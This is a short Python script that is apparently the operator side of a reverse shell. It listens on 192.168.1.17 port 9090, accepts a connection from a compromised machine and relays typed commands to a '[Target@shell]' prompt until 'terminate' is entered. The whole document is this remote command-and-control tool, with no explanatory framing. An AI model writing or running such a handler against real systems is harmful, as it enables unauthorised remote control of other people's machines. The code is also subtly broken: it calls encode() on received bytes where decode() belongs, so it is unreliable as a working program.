import socket

def connect():
    s = socket.socket()
    s.bind(("192.168.1.17", 9090))
    s.listen(1)

    conn,addr = s.accept()
    print("(+) We go a connection from", addr)

    while True:
        command = input("[Target@shell]>>>>")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(2048).encode())
def main():
    connect()
main()